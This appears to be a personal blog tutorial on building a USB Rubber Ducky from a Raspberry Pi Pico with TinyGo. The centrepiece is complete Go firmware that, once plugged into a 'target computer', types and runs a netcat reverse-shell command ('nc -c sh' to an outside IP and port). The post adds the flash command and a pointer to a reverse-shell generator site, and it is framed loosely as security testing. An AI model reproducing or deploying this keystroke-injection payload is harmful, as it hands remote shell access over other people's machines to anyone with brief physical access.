---
title : "Rubber Ducky With Pi Pico"
date : 2026-07-01  
categories : [hardware]
tags : [hardware]

image:
    path:  /assets/img/posts/rubber-ducky/pico.jpg
    alt : Pico Pi 
---


## What is a USB Rubber Ducky?
A USB Rubber Ducky is a device that appears as a keyboard to the target computer. When plugged in, it can execute pre-programmed keystrokes at incredible speeds, making it useful for security testing and demonstrations. 

## Why Pi Pico?
The Raspberry Pi Pico offers several advantages:
- Cost-effective alternative to commercial USB Rubber Ducky devices 
- Highly customizable and programmable
- Small form factor
- Open-source firmware and tools


## Getting Started
To use the Pi Pico as a USB HID device, you'll need to flash it with appropriate firmware that enables HID functionality. There are several approaches: 

### Tools :
1. Pico Pi (RP2024)
2. Convert male USB-Male Type male 
<div style="display: flex; flex-wrap: wrap; gap: 10px;">
  <img src="/assets/img/posts/rubber-ducky/1.jpg" width="300" alt="Pi Pico">
  <img src="/assets/img/posts/rubber-ducky/2.jpg" width="300" alt="Adapter">
  <img src="/assets/img/posts/rubber-ducky/3.jpg" width="300" alt="Final Device">
</div>

### Steps :
1. install [Tinygo](https://tinygo.org/)
2. Create a new directory for the project
3. Create a new file called main.go
4. Write the following code : *this example for connection netcat to the server* :

```go

    package main

    import (
        "machine/usb/hid/keyboard"
        "time"
    )

    func main() { 
        kb := keyboard.Port()
        time.Sleep(3 * time.Second)
        kb.Down(keyboard.KeyLeftCtrl)
        kb.Press(keyboard.KeyP)
        kb.UpAll()  
        time.Sleep(1 * time.Second)
        cmd := "nc -c sh 192.168.1.3 9901"
        typeString(kb, cmd)
        kb.Press(keyboard.KeyEnter)
    }

    
    func typeString(kb *keyboard.Device, str string) {
        for _, char := range str {
            switch char {
            case ' ':
                kb.Press(keyboard.KeySpace)
            case '.':
                kb.Press(keyboard.KeyPeriod)
            case '-':
                kb.Press(keyboard.KeyMinus)
            
            
            case '0': kb.Press(keyboard.Key0)
            case '1': kb.Press(keyboard.Key1)
            case '2': kb.Press(keyboard.Key2)
            case '3': kb.Press(keyboard.Key3)
            case '4': kb.Press(keyboard.Key4)
            case '5': kb.Press(keyboard.Key5)
            case '6': kb.Press(keyboard.Key6)
            case '7': kb.Press(keyboard.Key7)
            case '8': kb.Press(keyboard.Key8)
            case '9': kb.Press(keyboard.Key9)
    
            default:
            
                if char >= 'a' && char <= 'z' {
                    
                    k := keyboard.Code(uint8(keyboard.KeyA) + uint8(char-'a'))
                    kb.Press(k)
                }
            }
            
            time.Sleep(20 * time.Millisecond)
        }
}
          
``` 
5. Connect the Pi pico to the PC
6. Run the following command to flash the firmware to the Pi pico:

```bash
tinygo flash -target=pico main.go
```

7. Connect the converted USB to the target computer
8. can you using command reverse shell for [reverse shell site](https://www.revshells.com/)

- Here is a video example test of using the Pi Pico Rubber Ducky setup: 
<div style="max-width: 600px">
          <video width="100%" height="315" controls>
            <source src="/assets/img/posts/rubber-ducky/IMG_0542.MOV" type="video/mp4" />
            <source src="/assets/img/posts/rubber-ducky/IMG_0542.MOV" type="video/quicktime" />
            Your browser does not support the video tag.
          </video>
</div>

>  I chose `TinyGo` because I like the Go language, it’s faster than `Python`, and it’s generally more practical and efficient for hacking purposes.
{: .prompt-tip }